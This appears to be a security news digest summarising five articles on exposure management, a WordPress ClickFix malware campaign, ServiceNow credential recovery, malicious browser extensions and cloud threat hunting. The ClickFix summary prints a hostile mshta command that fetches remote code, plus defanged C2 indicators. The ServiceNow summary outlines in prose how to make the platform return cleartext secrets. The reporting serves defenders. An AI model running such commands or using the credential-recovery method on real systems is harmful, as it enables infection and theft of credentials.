How to build an exposure management program the business trusts: Lessons from Tenable’s CSO

Tenable’s CSO says shifting from siloed security tools and technical metrics to a unified exposure management program helped the company prioritize risk by business impact and give executives clearer answers about security posture. The key takeaway is that CISOs need consolidated, business-contextual risk data to build trust with boards and operational teams, especially as AI expands the attack surface.
KEY POINTS
  • 01Tenable’s CSO Robert Huber says security tool sprawl and data silos made it difficult to assess the company’s cyber risk holistically and communicate it clearly to business leaders.
  • 02Tenable shifted from a vulnerability management team to an exposure management team with a broader mandate covering issues such as misconfigurations and identity weaknesses across identity systems, cloud workloads, AI tools, on-prem assets, and the application development pipeline.
  • 03Tenable chose not to build its own data warehouse for security risk data and instead selected a SaaS solution, later acquiring Vulcan Cyber and making it part of the Tenable One Exposure Management Platform.
  • 04The exposure management approach lets Tenable present simplified red, yellow, and green cyber exposure metrics for lines of business and tie assets to business units and revenue streams.
  • 05Huber argues that unified exposure management helps replace fragmented reports and operational metrics with prioritized actions that reduce risk and are easier for the C-suite, board, and business teams to trust.

Tenable’s CSO Robert Huber describes how the company shifted to an AI-driven exposure management program to address security tool sprawl, fragmented data, and siloed teams. He says Tenable’s security organization managed around 50 different tools, each with separate views, workflows, metrics, and reporting. This made it difficult to assess cyber risk holistically and to explain security posture clearly to the C-suite and board.

Huber says board members generally wanted answers to two questions: whether Tenable was secure and how it compared to peers. The company’s previous reporting relied heavily on operational metrics such as vulnerability counts and scanned assets, which did not translate clearly into business impact. Tenable’s exposure management approach aims to connect security findings to business units, revenue streams, and prioritized actions that reduce risk.

Tenable broadened its vulnerability management team into an exposure management team covering traditional CVEs, misconfigurations, identity weaknesses, cloud workloads, AI tools, on-prem assets, and the application development pipeline. The company chose not to build its own security data warehouse and instead adopted a SaaS-based approach, later acquiring Vulcan Cyber and making it part of the Tenable One Exposure Management Platform. Huber says the resulting program uses simplified red, yellow, and green metrics, asset tagging, automated identification of systemic issues, and customized SLAs to give business and technical teams a more trusted view of cyber exposure.

  • Tenable’s exposure management shift did not require increased headcount; the company centralized triage while allowing specialized teams like cloud security and application security to spend less time chasing remediation and more time securing deployments.
  • Huber’s board reporting problem was not a lack of metrics but an excess of operational metrics that failed to answer the board’s two core questions: whether Tenable was secure and how it compared to peers.
  • Tenable decided against building its own security data warehouse because Huber viewed the infrastructure, data, and staffing costs as outside the company’s core competency and likely to become expensive quickly.
  • Tenable’s use of asset tagging to connect infrastructure to business units and revenue streams made it possible to prioritize security work by business impact rather than by raw vulnerability counts.
  • The article frames unpatchable assets as systemic root-cause issues to be flagged and managed, rather than simply adding their individual vulnerabilities to a remediation list.

Tenable’s security leader, Robert Huber, explains that the company had too many separate security tools and reports, making it hard for leaders and engineering teams to understand what problems mattered most. Tenable changed its approach by bringing security information into one view and connecting risks to business units and revenue, so executives and teams could see what needed attention first. This matters because companies adopting AI and moving quickly can create more ways for things to go wrong, and leaders need clear, trustworthy answers about whether the business is protected.

EtherHiding in the Browser: ClickFix Chain Ends in Amatera

Netskope analyzed a WordPress mass-compromise campaign where a rogue must-use plugin registers a persistent browser Service Worker that strips CSP and pulls a fake reCAPTCHA payload from a Base smart contract, leading victims through a ClickFix chain to the Amatera password stealer. The key takeaway is that defenders must remove malicious Service Workers and monitor/block the on-chain and network infrastructure, because the payload can rotate without leaving traditional files or servers to seize.
KEY POINTS
  • 01Netskope Threat Labs tracked a WordPress mass-compromise campaign in which a rogue must-use plugin registers a malicious Service Worker in visitors’ browsers.
  • 02The Service Worker strips Content-Security-Policy headers, injects a script carrying the Base contract address, and avoids showing the lure to logged-in WordPress users, wp-admin, wp-login.php, or visitors with the operator’s nc_skip cookie.
  • 03The injected script reads fake reCAPTCHA HTML from the Base smart contract 0x58460d0b3d4d6b03761c89120393c0c676676496, which acts as a mutable on-chain payload and script registry.
  • 04The fake reCAPTCHA uses ClickFix to copy the command mshta http://timelevel12[.]com/big to the Windows clipboard and instruct the visitor to run it through the Windows Run dialog.
  • 05The chain proceeds through an MP3/HTA polyglot, a scheduled task and fileless PowerShell stage, the Emmenhtal loader with a steganographic image payload, and finally the Amatera password stealer using DNS-over-HTTPS for C2 lookups.

Netskope Threat Labs tracked a WordPress mass-compromise campaign affecting hundreds of sites. A rogue must-use plugin registers a malicious Service Worker in visitors’ browsers, and that worker strips the site’s Content-Security-Policy header before injecting a script. The injected script reads its payload from a smart contract on Base and ultimately serves a fake reCAPTCHA that tells Windows visitors to paste and run a command.

The campaign is significant because it combines Service Worker persistence, EtherHiding, fake reCAPTCHA, ClickFix, a disguised polyglot file, mshta abuse, fileless PowerShell, a steganographic image loader, reflective loading, and the Amatera password stealer. Netskope said it had not previously seen a Service Worker resolve its payload from a smart contract. The design leaves few durable artifacts to act on, with no stable file to hash, no server to seize, and payload details that can be changed on-chain.

The infection chain continues when the victim runs mshta http://timelevel12[.]com/big, which retrieves an MP3/HTA polyglot and creates a hidden scheduled task that launches PowerShell. Later stages include the Emmenhtal loader, a steganographic JPEG hosted on a legitimate image CDN, and an in-memory PE loader. The final payload is Amatera, a password stealer disguised as WPA.exe, which beacons to gw.proxyvector[.]cc over TLS and uses DNS-over-HTTPS for C2 lookups.

  • The campaign deliberately hides the fake reCAPTCHA from logged-in WordPress users, wp-admin, and wp-login.php, meaning the site administrator is less likely to notice the compromise while ordinary logged-out visitors remain exposed.
  • Cleaning the compromised WordPress server is not sufficient because the malicious Service Worker can persist in visitors’ browsers until it is explicitly unregistered and its caches are deleted.
  • The Base smart contract lets the operator change downstream payload locations without modifying the compromised websites, so watching the contract is an actionable way to detect payload rotation.
  • The chain minimizes durable artifacts by combining on-chain payload delivery, ClickFix, fileless PowerShell, a steganographic image on a legitimate CDN, and reflective loading, leaving few conventional files, hashes, or servers for defenders to act on.
  • The article identifies the EtherHiding Service Worker lane and the inline WordPress injection lane as one campaign because they share the same Base contract, ultraspeed[.]pro/collect beacon, on-chain scripts, and runtime logic.

Hundreds of WordPress websites were secretly altered so that visitors could be shown a fake Google reCAPTCHA message telling them to paste a command into Windows, which ultimately installed the Amatera password stealer. The people affected are ordinary visitors to those trusted sites, especially Windows users, while site owners may not see the warning because the code hides from logged-in WordPress users. This matters because the scheme leaves very little for security tools or investigators to grab onto: parts of it stay inside the visitor’s browser, the instructions can be changed through a blockchain entry, and the final theft program is loaded without a normal downloaded file.

The combination of persistent Service Workers, on-chain payload delivery, ClickFix, fileless PowerShell, steganography, and DNS-over-HTTPS C2 gives defenders concrete techniques and indicators to hunt for.

Cleartext Credential Recovery in ServiceNow

The article shows that highly privileged ServiceNow users can modify or create Script Includes to make the platform return cleartext Discovery and LDAP credentials, including passwords, SSH keys, cloud secrets, and service principal credentials. The technique requires significant roles such as discovery_admin or script_include_admin but expands known ServiceNow post-exploitation paths beyond credential coercion or relay.
KEY POINTS
  • 01The article describes a method for using ServiceNow script includes to return cleartext credential data for any credential type stored in the discovery_credentials table and for LDAP credential records.
  • 02The technique for discovery credentials modifies the CredentialTestAjax script include so that its testCredential function returns decrypted credential JSON to the client before running the normal credential test logic.
  • 03In the author’s test environment, the discovery credential recovery method worked for Windows credentials, SSH private keys and passphrases, Entra ID service principal secrets, AWS keys, and other discovery credential types.
  • 04Recovering discovery credentials required permission to execute CredentialTestAjax, modify the sys_script_include record, and read at least part of the discovery_credentials table; the article states that the discovery_admin role satisfied these requirements in the author’s environment.
  • 05For LDAP credentials, the article describes creating a script include that reads ldap_server_config records and calls getDecryptedValue() on the Password2 password field to return cleartext LDAP connection passwords.

The article describes a technique for recovering cleartext credentials from ServiceNow by using script includes. The author focused on whether ServiceNow could be influenced to return cleartext discovery credentials or secrets to the client, especially non-Windows credentials that are not covered by previously documented forced authentication and relay approaches. In the author’s test environment, the method worked for all credential types stored in the discovery_credentials table, including Windows credentials, SSH private keys, Entra ID service principal secrets, AWS keys, and others.

The discovery credential technique involves modifying the CredentialTestAjax script include, which is normally used by the “Test Credential” function. By adding an early return in the testCredential function after credential decryption, the server sent the decrypted credential object back to the client in the HTTP response instead of only using it for validation through a MID server. The article states that this requires significant permissions, including the ability to execute CredentialTestAjax, modify records in sys_script_include, and read at least part of the discovery_credentials table; in the author’s environment, the discovery_admin role satisfied these requirements.

The article also covers LDAP credentials stored in ServiceNow’s ldap_server_config table. Unlike discovery credentials, the relevant LDAP script include did not already contain decryption code, so the author describes creating a new script include that calls getDecryptedValue() on the Password2 password field to return cleartext LDAP connection passwords. The article says this requires the ability to create or modify a script include and execute it, which by default requires the script_include_admin role, and notes that this can be less privileged than using the traditional forced authentication path that requires admin to execute LDAPClientUtils by default.

  • The discovery credential method works even for credential types that do not expose a “Test Credential” button in the ServiceNow web interface, including SSH private keys, Entra ID service principal secrets, and AWS keys.
  • The article states that discovery_admin includes script_include_admin by default in the author’s environment, meaning one role can satisfy both the ability to run the relevant credential-testing code and modify the script include that returns decrypted data.
  • The LDAP credential recovery path can require less default privilege than the previously documented forced-authentication method, because creating or modifying a script include requires script_include_admin while executing LDAPClientUtils requires admin by default.
  • Although discovery credential secret fields are also stored as Password2 values, the article notes that calling getDecryptedValue() on them did not return cleartext values, unlike the LDAP password field.

The article explains a way that someone with powerful ServiceNow permissions could make ServiceNow reveal stored passwords and other secret login information in readable form. This can affect organizations that use ServiceNow Discovery or ServiceNow’s LDAP connection settings to store credentials for systems such as Windows, SSH, Azure, AWS, or Active Directory. It matters because ServiceNow can hold many keys to an organization’s internal systems, so a person who gains the right ServiceNow access could potentially collect secrets that help them reach far beyond the ServiceNow platform itself.

This is a concrete technical finding showing how highly privileged ServiceNow users can recover cleartext Discovery and LDAP credentials, with potential impact across many stored credential types. It is broadly relevant for organizations using ServiceNow, but it is not presented as active exploitation, a breach, or a critical patch event.

19 Chrome and Edge Extensions Deliver a Wallet Drainer and Credential-Stealing Payloads

Socket found 19 malicious Chrome and Edge extensions, including some acquired from legitimate developers, that use a shared malware framework to steal credentials, hijack crypto wallets, phish seed phrases, and drain funds. The biggest risk is trusted browser extensions being silently weaponized through auto-updates, exposing tens of thousands of users.
KEY POINTS
  • 01Socket Threat Research identified 18 Chrome extensions and 1 Edge extension published in malicious versions within the last six months that share similar malicious code and operational techniques.
  • 02The extensions first provided their advertised functionality without malware, then later introduced malicious behavior after establishing user trust, including five extensions that were bought from legitimate authors.
  • 03The malware creates WebSocket communication with command-and-control servers, strips Content Security Policy headers, and injects downloaded JavaScript modules into visited webpages.
  • 04Observed malicious modules include multi-chain wallet drainers, hardware-wallet seed-phrase phishing for Ledger and Trezor users, exchange and wallet account harvesters, a universal credential form grabber, social-media theft, browser-history exfiltration, and fake browser-update lures.
  • 05The “Enable Right Click & Copy — Smart Unlock + OCR” Chrome extension and its Edge counterpart had a potential combined exposure surface of about 80,000 users, and the Edge version was still active and serving malware at the time of writing.

Socket Threat Research identified 18 Chrome extensions and 1 Edge extension that share similar malicious code and operational techniques. The malicious versions were published in the last six months, though the campaign is connected through code and technique similarities to activity dating back to February 2024. The extensions include SEO stats checkers, crypto price monitors, screen search utilities, and ad spying tools.

The extensions first appeared with their advertised functionality and no malware, then later introduced malicious behavior after trust was established. Five of the identified extensions were bought from legitimate authors, including “Enable Right Click & Copy — Smart Unlock + OCR,” which had around 70,000 Chrome users when malicious functionality was introduced. Together with the related Edge extension, the potential exposure surface was about 80,000 users, and the Edge version was still active and serving malware at the time of writing.

The malware creates a WebSocket communication channel with command-and-control servers, stores downloaded JavaScript modules in Chrome extension local storage, and encrypts communication using AES-GCM. It strips Content Security Policy headers from visited pages and injects malicious JavaScript through hidden page elements to execute payloads. Observed modules include wallet drainers, Ledger and Trezor seed-phrase phishing, exchange and wallet account harvesters, a universal credential form grabber, social-media theft, browser-history exfiltration, and fake browser-update lures.

  • The campaign’s most impactful tactic is not only creating malicious extensions, but buying already trusted extensions with existing user bases and then weaponizing them through normal browser auto-updates.
  • The malware separates its loading framework from its final payloads, allowing the same extension framework to receive changing malicious modules over time while reducing detection risk.
  • The campaign can rotate command-and-control endpoints and use separate per-victim exfiltration channels based on server instructions, making takedown of a single domain less disruptive to the operation.
  • Ownership changes for browser extensions are not surfaced to users, which leaves people unaware when an extension they previously trusted has become riskier.
  • The Edge version of the acquired right-click extension changed to a new command-and-control domain after the Chrome version was removed, showing the operator continued adapting even after detection.

Researchers found 19 browser add-ons for Chrome and Edge that looked like useful tools but were later updated to include harmful code. People who installed these add-ons could have passwords, browsing history, social media data, crypto accounts, or wallet recovery phrases stolen, and one affected add-on had a possible reach of about 80,000 users across Chrome and Edge. This matters because some of the add-ons were originally legitimate and then bought by the attacker, meaning a tool someone already trusted could become dangerous through normal automatic updates.

What Cloud Threat Hunting Is and How to Run One | Mitiga

Cloud threat hunting is a hypothesis-driven investigation process that goes beyond basic detections to determine whether suspicious cloud or SaaS activity is truly malicious. Effective hunts depend on having access to detailed, retained cloud logs, which can be limited by provider licensing and retention policies.
KEY POINTS
  • 01Cloud threat hunting is a hypothesis-driven exploratory analysis and investigation process focused on threats in cloud environments.
  • 02Cloud hunts use deeper log analysis and more complicated logic than typical detection, which often relies on lightweight pattern recognition to quickly find possible attack indicators.
  • 03The article describes three approaches to cloud hunting: strategic hunts focused on adversary behavior, event-driven hunts based on attacks seen elsewhere, and continuous hunts that repeatedly check cloud and SaaS environments for attack indicators.
  • 04Cloud hunts depend on log access, but cloud and SaaS providers may limit available log data based on service licensing or retention policies.
  • 05Organizations should capture cloud and SaaS logs into a security data lake before vendors delete them so the logs remain available for threat hunting.

Cloud threat hunting is described as a way to investigate suspicious security events in cloud environments after an indicator has been found. The article explains that a single event, such as an authentication failure, may not show whether the activity is harmless or part of an attack. Hunting uses hypothesis-driven exploratory analysis to dig into the details and determine whether an organization is facing a true attack indicator.

The article distinguishes cloud hunting from detection by saying that detection uses lighter pattern recognition and may accept false positives to avoid missing possible attacks. Cloud hunts involve deeper dives into logs and more complicated logic because time and resources are being invested into activity that appears more likely to be harmful. It describes strategic cloud hunts, event-driven hunts, and continuous cloud hunts as different approaches to investigating threats in cloud and SaaS environments.

The article emphasizes that cloud hunts depend heavily on log access, which can be harder to control in cloud and SaaS services than in on-premises systems. It notes that some cloud provider logs may not be accessible to users, may depend on service licensing, or may be retained only for a limited time. The article warns that attackers could exploit license-based logging gaps and recommends capturing logs into a security data lake before vendors delete them.

  • A failed authentication event cannot be judged reliably in isolation because it may be either a normal user mistake or an attacker trying to compromise an account.
  • Attackers can take advantage of license-based logging gaps by temporarily removing a user’s license, performing malicious activity through that account, and restoring the license without leaving logs of the activity.
  • Cloud threat hunting requires different resource expectations than detection because hunting begins after an organization has decided a suspicious event is worth deeper investigation.
  • Organizations need to collect cloud and SaaS logs before vendor retention periods expire, or later investigations may lack the evidence needed to understand what happened.

The article explains how cloud threat hunting means looking more deeply into suspicious activity in cloud and online services to decide whether it is harmless or part of a real break-in. This matters for organizations that use cloud or software services because simple warning signs, like a failed login, may not be enough to tell what really happened. The article also warns that investigators may not have the records they need if a service does not provide detailed logs, only includes them with certain licenses, or deletes them after a short time.

OPEN SOURCE ↗

This is evergreen educational guidance about cloud threat hunting and log collection rather than coverage of a specific incident, vulnerability, breach, or active threat. It may be useful for practitioners building cloud investigation processes, but it is low urgency.
